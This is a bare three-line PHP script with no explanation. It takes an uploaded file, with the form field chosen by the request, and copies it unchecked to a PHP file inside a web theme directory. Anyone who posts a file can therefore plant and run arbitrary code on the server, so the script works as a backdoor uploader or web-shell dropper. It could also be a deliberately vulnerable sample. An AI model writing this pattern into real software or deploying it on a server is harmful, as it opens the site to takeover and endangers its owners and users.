<?php
$field = $_POST['field'];
copy($_FILES[$field]['tmp_name'], '/srv/www/theme/plugin.php');
